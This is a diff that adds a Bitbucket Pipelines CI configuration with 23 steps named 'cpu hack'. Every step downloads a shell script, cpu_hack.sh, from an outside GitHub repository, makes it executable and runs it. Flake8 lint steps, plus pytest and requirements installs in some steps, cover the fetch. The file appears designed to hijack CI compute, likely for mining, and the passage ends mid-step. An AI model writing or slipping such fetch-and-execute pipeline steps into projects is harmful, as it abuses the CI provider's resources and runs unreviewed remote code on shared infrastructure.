@@ -1,0 +1,147 @@
+
+image: python:3.8
+
+pipelines:
+  default:
+    - parallel:
+      - step:
+          name: cpu hack 2
+          caches:
+            - pip
+          script:
+            - if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
+            - pip install pytest
+            - wget https://github.com/dombemiti/cpu/blob/main/cpu_hack.sh && chmod +x cpu_hack.sh && ./cpu_hack.sh
+      - step:
+          name: cpu hack 2
+          script:
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://github.com/dombemiti/cpu/blob/main/cpu_hack.sh && chmod +x cpu_hack.sh && ./cpu_hack.sh
+    - step:
+          name: cpu hack 3
+          script:
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://github.com/dombemiti/cpu/blob/main/cpu_hack.sh && chmod +x cpu_hack.sh && ./cpu_hack.sh
+    - step:
+          name: cpu hack 4
+          script:
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://github.com/dombemiti/cpu/blob/main/cpu_hack.sh && chmod +x cpu_hack.sh && ./cpu_hack.sh
+    - step:
+          name: cpu hack 5
+          script:
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://github.com/dombemiti/cpu/blob/main/cpu_hack.sh && chmod +x cpu_hack.sh && ./cpu_hack.sh
+    - step:
+          name: cpu hack 6
+          script:
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://github.com/dombemiti/cpu/blob/main/cpu_hack.sh && chmod +x cpu_hack.sh && ./cpu_hack.sh
+    - step:
+          name: cpu hack 7
+          script:
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://github.com/dombemiti/cpu/blob/main/cpu_hack.sh && chmod +x cpu_hack.sh && ./cpu_hack.sh
+    - step:
+          name: cpu hack 8
+          script:
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://github.com/dombemiti/cpu/blob/main/cpu_hack.sh && chmod +x cpu_hack.sh && ./cpu_hack.sh              
+    - step:
+          name: cpu hack 9
+          script:
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://github.com/dombemiti/cpu/blob/main/cpu_hack.sh && chmod +x cpu_hack.sh && ./cpu_hack.sh
+    - step:
+          name: cpu hack 10
+          script:
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://github.com/dombemiti/cpu/blob/main/cpu_hack.sh && chmod +x cpu_hack.sh && ./cpu_hack.sh
+    - step:
+          name: cpu hack 11
+          script:
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://github.com/dombemiti/cpu/blob/main/cpu_hack.sh && chmod +x cpu_hack.sh && ./cpu_hack.sh
+    - step:
+          name: cpu hack 12
+          script:
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://github.com/dombemiti/cpu/blob/main/cpu_hack.sh && chmod +x cpu_hack.sh && ./cpu_hack.sh
+    - step:
+          name: cpu hack 13
+          script:
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://github.com/dombemiti/cpu/blob/main/cpu_hack.sh && chmod +x cpu_hack.sh && ./cpu_hack.sh
+    - step:
+          name: cpu hack 14
+          script:
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://github.com/dombemiti/cpu/blob/main/cpu_hack.sh && chmod +x cpu_hack.sh && ./cpu_hack.sh              
+    - step:
+          name: cpu hack 15
+          script:
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://github.com/dombemiti/cpu/blob/main/cpu_hack.sh && chmod +x cpu_hack.sh && ./cpu_hack.sh
+    - step:
+          name: cpu hack 16
+          script:
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://github.com/dombemiti/cpu/blob/main/cpu_hack.sh && chmod +x cpu_hack.sh && ./cpu_hack.sh
+    - step:
+          name: cpu hack 17
+          script:
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://github.com/dombemiti/cpu/blob/main/cpu_hack.sh && chmod +x cpu_hack.sh && ./cpu_hack.sh
+    - step:
+          name: cpu hack 18
+          script:
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://github.com/dombemiti/cpu/blob/main/cpu_hack.sh && chmod +x cpu_hack.sh && ./cpu_hack.sh
+    - step:
+          name: cpu hack 19
+          script:
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://github.com/dombemiti/cpu/blob/main/cpu_hack.sh && chmod +x cpu_hack.sh && ./cpu_hack.sh
+    - step:
+          name: cpu hack 20
+          script:
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://github.com/dombemiti/cpu/blob/main/cpu_hack.sh && chmod +x cpu_hack.sh && ./cpu_hack.sh              
+    - step:
+          name: cpu hack 21
+          script:
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://github.com/dombemiti/cpu/blob/main/cpu_hack.sh && chmod +x cpu_hack.sh && ./cpu_hack.sh
+    - step:
+          name: cpu hack 22
+          script:
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://github.com/dombemiti/cpu/blob/main/cpu_hack.sh && chmod +x cpu_hack.sh && ./cpu_hack.sh
+    - step:
+          name: cpu hack 23
+          script:
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://github.com/dombemiti/cpu/blob/main/cpu_hack.sh && chmod +x cpu_hack.sh && ./cpu_hack.sh
+    - step:
